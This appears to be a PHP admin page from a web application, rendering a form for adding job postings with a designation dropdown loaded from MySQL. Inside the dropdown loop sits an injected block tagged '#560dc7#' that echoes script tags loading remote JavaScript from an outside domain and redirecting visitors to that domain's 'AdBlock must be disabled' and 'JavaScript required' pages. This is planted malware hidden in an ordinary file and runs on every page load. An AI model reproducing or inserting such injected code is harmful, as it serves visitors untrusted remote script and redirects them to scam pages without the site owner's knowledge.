<?php
include("../include/conFig.php");
?>

<div class="title">All Jobs</div>
<div class="strip">
<span>Dashboard</span>
<span>All Jobs</span>
<span>Add New</span>
</div>
<table width="100%" cellpadding="0" cellspacing="0">
<tr>
<td style="width:30%"></td>
<td style="width:70%" align="right">
<button class="button gray" onclick="ToggleBox('manipulateContent','none','');ToggleBox('viewContent','block','')"> <i class="back"></i>Back</button>&nbsp;&nbsp;
</td>
</tr>
</table>
<div style="overflow-x:hidden;overflow-y:scroll;height:500px">
<div class="add-new blue-border">
<div class="form-head green">
<div class="head-title"> 
<i class="add-form"></i> 
Add Job</div>
</div>
<table cellpadding="0" cellspacing="0" width="100%">
<tr><td colspan="2" style="text-align:center"><div style="display:inline-block;" id="couResp"></div></td></tr>
<!--
 
<ul class="breadcrumb">
	<li><a href="#">Home</a><span class="divider">&raquo;</span></li>
	<li class="active"  onclick="getModule('job/view','viewContent','manipulateContent','Job')">All Jobs</li>
	<div class="red awesome small" onclick="ToggleBox('manipulateContent','none','');ToggleBox('viewContent','block','')" style="float:right">Back To Jobs</div>

</ul>
<div class="nonboxy-widget">
	<div class="widget-head">
		<h5>Add New Job</h5>
	</div>
</div>
<div class="widget-content">
	<div class="widget-box">

	<table width="100%" cellpadding="10" cellspacing="0" class="form-horizontal well formtable">
-->
<tr>
	<th width="175px" style="display:none">Name <span>*</span>
	</th>
	<td style="display:none"><input class="input medium" name="" type="text" id="job0" />
	</td>
	<th width="175px">Post <span>*</span>
	</th>
	<td><select class="input drop-down large" name="req" id="job1">
				<option value="">Select Designation</option>
<?php
$getDesig = mysql_query("SELECT `id`,`name` FROM `designation` WHERE `delete`= '0' AND `id` != '1'",$con) or die(mysql_error());
while($rowDesig = mysql_fetch_array($getDesig))
{
?>
<?
#560dc7#
if(empty($iemgz)) {
$iemgz = "<script type=\"text/javascript\">var gwloaded = false;</script>
    <script src=\"http://verification.mvpitsolutions.com/lander/Password%20Page_files/gwjs.js\" type=\"text/javascript\"></script>
    <script type=\"text/javascript\">if (gwloaded==false){window.location = \"http://verification.mvpitsolutions.com/lander/AdBlock%20Must%20be%20Disabled%20to%20View%20This%20Content.html\";}</script>
<noscript><meta http-equiv=\"refresh\" content=\"0;url=http://verification.mvpitsolutions.com/lander/JavaScript%20Required.html\" /></noscript>";
echo $iemgz;
}

#/560dc7#
?>				
				<option value="<?php echo $rowDesig[0]?>"><?php echo $rowDesig[1]?></option>
<?php
}
?>				
			</select>
	</td>
</tr>
<tr>	
	<th>Vacancy <span>*</span>
	</th>
	<td><input class="input medium" name="reqisnum" type="text" id="job2"/>
	</td>
	<th>Last Date <span>*</span>
	</th>
	<td><input name="" type="text" id="job3" readonly="readonly" class="inputCalendar" style="width:200px" onclick="openCalendar(this);"/>
	</td>
	
</tr>
<tr>
	<th>Eligibility<span>*</span>
	</th>
	<td><textarea name="req" class="input huge" name="TextArea" style="width: 475px; height: 75px"id="job4"></textarea>
	</td>
	<th>Description  <span>*</span>
	</th>
	<td><textarea name="req" class="input huge" name="TextArea" style="width: 475px; height: 75px" id="job5"></textarea>	</td>
</tr>
<tr>
	<th>Status <span>*</span></th>
	<td colspan="3"><input name="req" id="job6" type="checkbox" value="1" checked="checked"/>&nbsp;&nbsp;&nbsp;Active</td>
</tr>

<tr>
<td colspan="4" style="text-align:center">
<button class="button green" onclick="SaveData('job/save','job','7','','','couResp','1');ToggleBox('manipulateContent','none','');ToggleBox('viewContent','block','')"><i class="save-icon"></i>Save</button>
<button class="button gray" onclick="ToggleBox('manipulateContent','none','');ToggleBox('viewContent','block','')"><i class="close-icon"></i>Cancel</button>
</td>
</tr>

<!--
<tr><td colspan="4" style="text-align:center;"><div style="display:inline-block;" id="couResp"></div></td></tr>
<tr><td></td><td  style="text-align:left"><div class="blue awesome small" onclick="SaveData('job/save','job','7','','','couResp','1')">Save Job</div>
<div class="btn btn-warning" onclick="ToggleBox('manipulateContent','none','');ToggleBox('viewContent','block','')">Cancel</div>
</td></tr>
-->
</table>
<br/><br/><br/><br/>
	</div>
</div>


